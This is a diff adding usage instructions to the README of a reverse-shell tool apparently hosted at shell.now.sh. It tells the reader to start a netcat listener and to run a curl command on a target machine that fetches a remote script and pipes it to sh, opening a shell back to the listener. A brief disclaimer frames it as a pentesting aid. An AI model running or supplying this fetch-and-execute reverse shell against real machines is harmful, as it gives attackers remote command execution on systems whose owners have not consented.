@@ -8,6 +8,27 @@
 
 Easy to remember reverse shell that should work on most Unix-like systems.
 
+## Usage
+
+### 1. Listen for connection
+
+On your machine, open up a port and listen on it. You can do this easily with netcat.
+
+```
+nc -l 1337
+```
+### 2. Execute reverse shell on target
+
+On the target machine, pipe the output of https://shell.now.sh/yourip:port into sh.
+
+```
+curl https://shell.now.sh/192.168.0.69:1337 | sh
+```
+
+### 3. Don't be a dick
+
+This is meant to be used for pentesting or helping coworkers understand why they should always lock their computers. Please don't use this for anything malicious.
+
 ## License
 
 MIT © Luke Childs
